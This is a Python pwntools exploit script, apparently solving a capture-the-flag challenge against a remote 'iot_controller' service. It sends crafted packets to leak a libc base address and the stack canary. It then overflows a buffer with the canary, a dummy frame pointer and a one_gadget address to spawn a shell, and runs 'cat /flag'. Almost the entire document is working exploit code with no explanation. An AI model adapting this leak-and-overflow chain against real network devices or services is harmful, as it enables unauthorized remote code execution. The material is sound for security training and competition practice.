from pwn import *

# context.binary = "./iot_controller.bin"
# context.terminal = ['tmux', 'splitw', '-h']

ip=sys.argv[1]
port=int(sys.argv[2])
p = remote(ip,port)


def g():
    gdbscript= """
    #b *$rebase(0x1e56)
    #b *$rebase(0x1cae)
    b *$rebase(0x2028)
    """
    gdb.attach(p,gdbscript=gdbscript)

def pkt(t,v):
    payload = b"\x00"*2+p16(5)
    a = t+v
    l = len(a)
    payload += l.to_bytes(2,'big')
    payload = payload.ljust(0x10,b"\x00")
    payload += a
    return payload
one = [0xe6c84,0xe6c81,0xe6c7e]
def exp():
    #g()
    payload = b"\x00\x00\x01\x00"+b"\x01\x00\x00\x00"
    payload += pkt(b'\x02',p16(0x7e)+b'\x00'*(0x80*8))
    payload += pkt(b'\x04',p16(0x78))
    p.recvuntil("spell>")
    p.send(str(len(payload.decode('latin1'))).ljust(8,"\x00"))
    print(len(payload.decode('latin1')))
    p.recvuntil("> ")
    p.send(payload)
    p.recvuntil(" Device is ")
    a = p.recv(6).ljust(8,b'\x00')
    log.info("%s",hexdump(a))
    a = u64(a)-0x1ec6a0

    log.success("%3x",a)
    
    payload = b"\x00\x00\x01\x00"+b"\x01\x00\x00\x00"
    payload += pkt(b'\x02',p16(0x7e)+b'a'*(0x80*8))
    payload += pkt(b'\x04',p16(0x7f))
    p.recvuntil("spell>")
    p.send(str(len(payload.decode('latin1'))).ljust(8,"\x00"))
    p.recvuntil("> ")
    p.send(payload)
    p.recvuntil(" Device is ")
    canary = p.recv(8).ljust(8,b'\x00')
    canary = u64(canary)-0x3b
    log.success("%#x",canary)
    
    payload = b"\x00\x00\x01\x00"+b"\x01\x00\x00\x00"
    #payload += pkt(b'\x06',p16(0x30)+p16(0x7e))+b'a'*0x18+p64(canary)+p64(a+0x1000)+p64(one[1]+a)
    payload += pkt(b"\x0a",p16(300)+(b"1;1;1;"+b"\x41"*0x70+p64(canary+1)+p64(0xdeadbeefdeadbeef)+p64(a+one[1])).ljust(300,b'\x00') )

    p.recvuntil("spell>")
    p.send(str(len(payload.decode('latin1'))).ljust(8,"\x00"))
    p.recvuntil("> ")
    p.send(payload)
    p.sendline('cat /flag')
# print("flag{123213213213213}")      
    print(p.recvrepeat(1))
 
    # p.interactive()

if __name__ == "__main__":
    exp()
